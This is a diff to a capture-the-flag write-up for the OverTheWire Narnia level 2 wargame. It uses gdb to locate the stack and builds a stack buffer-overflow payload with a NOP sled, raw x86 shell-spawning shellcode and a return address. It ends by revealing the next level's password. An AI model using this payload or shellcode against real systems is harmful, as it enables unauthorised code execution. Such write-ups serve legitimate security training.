@@ -29,3 +29,38 @@ The rest is shown below:
 From this we see that the offset is 132. 
 With this information we can begin to develop our exploit.
 
+First we need to find the address we want to jump to where we will put a NOP sled to slide into our shellcode and execute it.  
+To do this we can use gdb to send 132 ‘A’s to the program and see at which memory addresses our input is landing.  
+Using the following commands we can load the binary into gdb and achieve this goal:  
+$ gdb ./narnia2   
+(gdb) break main  
+(gdb) r $(perl -e 'print "\x41"x132 . "\x42\x42\x42\x42";')  
+(gdb) c  
+(gdb) x/200x $esp  
+In which we then see the following:  
+<img width="625" alt="Screen Shot 2024-01-15 at 6 21 16 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/da7bf5b1-7431-4d90-b14a-32c32b008c5d">
+
+We pick a memory address early on when we start seeing our A’s (0x41). This shows where our input starts landing. For this instance I pick 0xffffd710.   
+We then need to find shellcode that we want to execute. For this challenge I am using shellcode from the shellstorm repository on github. A link to the exact shellcode I used is below:  
+https://github.com/7feilee/shellcode/blob/master/Linux/x86/execve(-bin-bash%2C_%5B-bin-sh%2C_-p%5D%2C_NULL).c  
+Now we can begin to develop our final exploit.  
+First we must determine the length of our shellcode so we can adjust our NOP padding appropriately.  
+To do this we can use python shown below:  
+<img width="625" alt="Screen Shot 2024-01-15 at 6 21 54 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/6035e933-c0df-4b74-83e6-338b48a856a1">
+
+From this we see that our shellcode is 33 bytes long.  
+Now that we have all of the pieces necessary we can craft our exploit.  
+We want to craft our exploit in the following format:  
+(NOP sled) -> (Shellcode) -> (Memory Address)  
+The final payload is:  
+./narnia2 $(perl -e 'print "\x90"x(132-33) . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "\x10\xd7\xff\xff";')  
+Running this we see the following:  
+<img width="628" alt="Screen Shot 2024-01-15 at 6 22 34 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/d3d98401-b609-46fd-9bd2-334cf6e4edd2">
+
+Pass: 8SyQ2wyEDU
+
+
+
+
+
+
